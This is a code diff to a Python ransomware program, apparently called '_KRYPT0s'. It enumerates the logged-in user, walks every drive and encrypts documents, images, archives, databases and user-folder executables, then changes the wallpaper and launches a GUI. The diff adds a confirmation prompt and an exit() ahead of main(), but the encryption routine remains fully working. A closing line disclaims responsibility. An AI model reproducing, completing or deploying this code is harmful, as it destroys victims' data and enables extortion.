@@ -196,20 +196,33 @@ def list_drives():
     
     return drives
 
-# Function to handle the traversal of files and encyrption, files searched for contain critical file extensions
-def traverse_encrypt(drive, key):
+def enumerate_username():
     try:
         username = os.getlogin() # Get username
     except:
-        username = os.environ.get('USERNAME') # Try username through enviromental variables
+        try:
+            username = os.environ.get('USERNAME') # Try username through enviromental variables
+        except:
+            pass
+        
+    if not username:
+        try:
+            result = subprocess.run(['whoami'], capture_output=True, text=True, check=True)
+            username = result.stdout.strip().split('\\')[-1]
+        except:
+            pass
     
+    return username
+
+# Function to handle the traversal of files and encyrption, files searched for contain critical file extensions
+def traverse_encrypt(drive, key):        
     extensions = (
         '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.png', '.jpg', 
         '.jpeg', '.bmp', '.gif', '.mp3', '.wav', '.mp4', '.mov', '.zip', '.rar', '.7z', 
         '.tar', '.bak', '.sql', '.xml', '.html', '.db', '.pst', '.docm', '.xlsm'
     )
 
-    def get_main_dirs(username, drive):
+    def get_main_dirs(username, drive):     
         # Construct dynamic destructive path
         main_dirs = [
             # Main folders of user
@@ -234,20 +247,26 @@ def traverse_encrypt(drive, key):
         return main_dirs
         
     for root, _, files in os.walk(drive):
+        # Get username for each drive
+        username = enumerate_username()
+        
         for file in files:
             # Skip custom wallpaper
             if "wallpaperX324HF.png" in file:
-                continue
+                continue    
             
-            if file.endswith('.exe'):
-                main_dirs = get_main_dirs(username, drive)
-                if any(root.startswith(main_dir) for main_dir in main_dirs):
-                    if file == "Screen.exe" or file == os.path.basename(__file__):
-                        # Skip to prevent self corruption
-                        continue
-                    else:
-                        # Will encyrpt .exe files featured in the general PC files to prevent system corruption
-                        encrypt_file(os.path.join(root, file), key)
+            if not username:
+                continue
+            else:
+                if file.endswith('.exe'):
+                    main_dirs = get_main_dirs(username, drive)
+                    if any(root.startswith(main_dir) for main_dir in main_dirs):
+                        if file == "Screen.exe" or file == os.path.basename(__file__):
+                            # Skip to prevent self corruption
+                            continue
+                        else:
+                            # Will encyrpt .exe files featured in the general PC files to prevent system corruption
+                            encrypt_file(os.path.join(root, file), key)
             
             if any(file.endswith(ext) for ext in extensions):
                 encrypt_file(os.path.join(root, file), key)
@@ -357,7 +376,10 @@ def main():
     change_windows_wallpaper()
     launch_gui() 
 
-if __name__ == "__main__":    
+if __name__ == "__main__":
+    input("ARE YOU SURE YOU WANT TO RUN?")
+    exit()
+    
     main() # Launch _KRYPT0s
 
 # I AM NOT RESPONSIBLE FOR ANY MISDOINGS
